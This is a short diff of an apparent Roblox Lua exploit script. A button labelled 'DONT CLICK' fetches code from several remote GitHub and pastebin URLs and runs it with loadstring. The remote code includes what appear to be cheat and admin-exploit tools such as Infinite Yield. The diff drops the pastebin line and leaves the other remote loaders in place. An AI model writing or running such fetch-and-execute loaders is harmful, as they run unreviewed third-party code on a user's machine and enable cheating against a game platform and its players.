@@ -33,7 +33,6 @@ Section:NewButton("DONT CLICK", "what", function()
 loadstring(game:HttpGet(("https://raw.githubusercontent.com/NOOBARMYSCRIPTER/NOOBARMYSCRIPTER/main/AXE%20LOOP%20SCRIPT"), true))()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
         loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/silentben8x/Silent/main/NuggetGui'))("Silent Was Here")
-            loadstring(game:HttpGet'https://pastebin.com/raw/hnVtRcyb')()
 end)
 
 
